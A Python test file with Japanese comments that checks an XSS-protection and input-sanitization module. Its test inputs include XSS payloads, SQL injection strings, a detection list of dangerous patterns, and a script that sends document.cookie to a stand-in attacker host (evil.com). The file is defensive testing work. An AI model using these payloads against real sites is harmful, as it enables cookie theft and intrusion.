"""
XSS対策・入力サニタイゼーション機能のテスト
"""

import pytest
from src.security.xss_protection import XSSProtection, sanitize_user_input, validate_filename, get_security_status


class TestXSSProtection:
    """XSS対策機能テスト"""
    
    def setup_method(self):
        """テスト前準備"""
        self.xss_protection = XSSProtection()
    
    def test_sanitize_basic_input(self):
        """基本的な入力サニタイゼーションテスト"""
        test_cases = [
            ("Hello World", "Hello World"),  # 正常な入力
            ("Hello <script>alert('xss')</script>", "Hello "),  # スクリプトタグ除去
            ("Hello <b>World</b>", "Hello World"),  # HTMLタグエスケープ
            ("Test & Demo", "Test &amp; Demo"),  # HTML特殊文字エスケープ
            ('Test "quotes"', "Test &quot;quotes&quot;"),  # クォートエスケープ
        ]
        
        for input_text, expected in test_cases:
            result = self.xss_protection.sanitize_input(input_text)
            assert result == expected, f"Input: {input_text}, Expected: {expected}, Got: {result}"
    
    def test_sanitize_dangerous_javascript(self):
        """危険なJavaScript除去テスト"""
        test_cases = [
            ("javascript:alert('xss')", "[REMOVED]alert('xss')"),
            ("onclick=alert(1)", "[REMOVED]alert(1)"),
            ("onload=malicious()", "[REMOVED]malicious()"),
            ("document.cookie", "[REMOVED].cookie"),
            ("window.location", "[REMOVED].location"),
            ("eval(malicious)", "[REMOVED](malicious)")
        ]
        
        for input_text, expected in test_cases:
            result = self.xss_protection.sanitize_input(input_text)
            assert "[REMOVED]" in result or result == expected
    
    def test_sanitize_sql_injection(self):
        """SQL injection対策テスト"""
        test_cases = [
            ("'; DROP TABLE users; --", "'; [SQL_BLOCKED] users; --"),
            ("UNION SELECT * FROM passwords", "[SQL_BLOCKED] * FROM passwords"),
            ("DELETE FROM table WHERE 1=1", "[SQL_BLOCKED] table WHERE 1=1"),
            ("INSERT INTO evil VALUES", "[SQL_BLOCKED] evil VALUES"),
            ("UPDATE users SET admin=1", "[SQL_BLOCKED] admin=1")
        ]
        
        for input_text, expected in test_cases:
            result = self.xss_protection.sanitize_input(input_text)
            assert "[SQL_BLOCKED]" in result
    
    def test_sanitize_html_tags(self):
        """危険なHTMLタグ除去テスト"""
        test_cases = [
            ("<script>alert('xss')</script>", "alert('xss')"),
            ("<iframe src='evil.com'></iframe>", ""),
            ("<object data='malicious.swf'></object>", ""),
            ("<embed src='evil.swf'>", ""),
            ("<form action='evil'></form>", ""),
            ("<input type='hidden' name='csrf'>", ""),
            ("<link rel='stylesheet' href='evil.css'>", "")
        ]
        
        for input_text, expected in test_cases:
            result = self.xss_protection.sanitize_input(input_text)
            # タグが除去されていることを確認
            assert "<script" not in result.lower()
            assert "<iframe" not in result.lower()
            assert "<object" not in result.lower()
    
    def test_sanitize_markdown_safe(self):
        """安全なMarkdown記法の処理テスト"""
        markdown_input = """
        # ヘッダー1
        ## ヘッダー2
        
        **太字テキスト**
        *斜体テキスト*
        `コードテキスト`
        
        - リストアイテム1
        - リストアイテム2
        
        1. 番号付きリスト
        2. 番号付きリスト2
        """
        
        result = self.xss_protection.sanitize_input(markdown_input, allow_markdown=True)
        # Markdownの基本要素は保持される
        assert "**太字テキスト**" in result
        assert "*斜体テキスト*" in result
        assert "`コードテキスト`" in result
        assert "# ヘッダー1" in result
    
    def test_sanitize_dangerous_markdown_links(self):
        """危険なMarkdownリンク処理テスト"""
        dangerous_links = [
            "[クリック](javascript:alert('xss'))",
            "[悪意あるリンク](javascript:void(0))",
            "[XSS](javascript:document.location='evil.com')"
        ]
        
        for link in dangerous_links:
            result = self.xss_protection.sanitize_input(link, allow_markdown=True)
            # JavaScriptスキームは除去される
            assert "javascript:" not in result.lower()
    
    def test_validate_filename(self):
        """ファイル名検証テスト"""
        test_cases = [
            ("normal_file.txt", "normal_file.txt"),
            ("file with spaces.pdf", "file with spaces.pdf"),
            ("file/with/path.txt", "file_with_path.txt"),  # パス区切り文字除去
            ("file\\with\\backslash.txt", "file_with_backslash.txt"),  # バックスラッシュ除去
            ("file<>:|?*.txt", "file.txt"),  # 危険な文字除去
            ("..dangerous.txt", "dangerous.txt"),  # 先頭ドット除去
            ("normal.file..txt", "normal.file.txt"),  # 連続ドット正規化
            ("", "sanitized_file"),  # 空ファイル名
            ("a" * 300 + ".txt", "a" * 250 + ".txt")  # 長いファイル名切り詰め
        ]
        
        for input_name, expected in test_cases:
            result = self.xss_protection.validate_file_name(input_name)
            if expected == "a" * 250 + ".txt":
                # 長いファイル名の場合は長さをチェック
                assert len(result) <= 255
                assert result.endswith(".txt")
            else:
                assert result == expected, f"Input: {input_name}, Expected: {expected}, Got: {result}"
    
    def test_check_streamlit_safety(self):
        """Streamlitセキュリティ状況確認テスト"""
        security_report = self.xss_protection.check_streamlit_safety()
        
        # レポート構造の確認
        assert "xss_protection" in security_report
        assert "csrf_protection" in security_report
        assert "content_security_policy" in security_report
        assert "additional_protections" in security_report
        
        # XSS保護の確認
        xss_protection = security_report["xss_protection"]
        assert xss_protection["status"] == "enabled"
        assert "Streamlitは標準でHTMLエスケープを実行" in xss_protection["description"]
        
        # 追加保護機能の確認
        additional = security_report["additional_protections"]
        assert "input_sanitization" in additional
        assert "file_validation" in additional
        assert "path_traversal_protection" in additional
    
    def test_convenience_functions(self):
        """便利関数のテスト"""
        # sanitize_user_input関数
        dangerous_input = "<script>alert('xss')</script>Hello"
        sanitized = sanitize_user_input(dangerous_input)
        assert "<script" not in sanitized
        assert "Hello" in sanitized
        
        # validate_filename関数
        dangerous_filename = "evil/file<>.txt"
        safe_filename = validate_filename(dangerous_filename)
        assert "/" not in safe_filename
        assert "<>" not in safe_filename
        
        # get_security_status関数
        status = get_security_status()
        assert isinstance(status, dict)
        assert "xss_protection" in status


class TestXSSProtectionIntegration:
    """XSS対策統合テスト"""
    
    def test_comprehensive_xss_protection(self):
        """包括的XSS対策テスト"""
        xss_protection = XSSProtection()
        
        # 複合的な攻撃パターン
        complex_attack = """
        <script>
            var img = new Image();
            img.src = 'http://evil.com/steal.php?cookie=' + document.cookie;
        </script>
        <iframe src="javascript:alert('XSS')"></iframe>
        <img src="x" onerror="alert('XSS')">
        <svg onload="alert('XSS')">
        """
        
        sanitized = xss_protection.sanitize_input(complex_attack)
        
        # 危険な要素が除去されていることを確認
        dangerous_patterns = [
            "<script", "javascript:", "onerror=", "onload=", 
            "<iframe", "<svg", "document.cookie", "alert("
        ]
        
        for pattern in dangerous_patterns:
            assert pattern not in sanitized.lower()
    
    def test_edge_cases(self):
        """エッジケースのテスト"""
        xss_protection = XSSProtection()
        
        # None入力
        assert xss_protection.sanitize_input(None) == "None"
        
        # 数値入力
        assert xss_protection.sanitize_input(12345) == "12345"
        
        # 空文字列
        assert xss_protection.sanitize_input("") == ""
        
        # 非常に長い入力
        long_input = "a" * 10000
        result = xss_protection.sanitize_input(long_input)
        assert len(result) == len(long_input)  # 正常な文字は保持される
    
    def test_japanese_text_handling(self):
        """日本語テキスト処理テスト"""
        xss_protection = XSSProtection()
        
        japanese_text = "こんにちは、世界！これは日本語のテストです。"
        result = xss_protection.sanitize_input(japanese_text)
        assert result == japanese_text  # 日本語は正常に保持される
        
        # 日本語と攻撃コードの混在
        mixed_input = "こんにちは<script>alert('XSS')</script>世界"
        result = xss_protection.sanitize_input(mixed_input)
        assert "こんにちは" in result
        assert "世界" in result
        assert "<script" not in result